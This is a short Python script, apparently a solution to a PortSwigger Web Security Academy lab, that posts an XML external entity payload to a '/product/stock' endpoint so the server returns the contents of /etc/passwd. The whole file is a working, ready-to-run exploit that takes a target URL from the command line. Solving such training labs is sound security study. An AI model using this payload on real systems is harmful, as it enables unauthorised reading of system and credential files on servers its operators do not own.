import sys
import requests

def main():
    try:
        url = sys.argv[1].rstrip("/")
        data = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd">]><stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>'
        response = requests.post(f"{url}/product/stock", data=data)
        print(response.text)

    except IndexError:
        print(f"Usage: python3 {sys.argv[0]} <url> \nExample: python3 {sys.argv[0]} https://0aa000b30398e74d82a6069b002d00f8.web-security-academy.net")

if __name__ == "__main__":
    main()
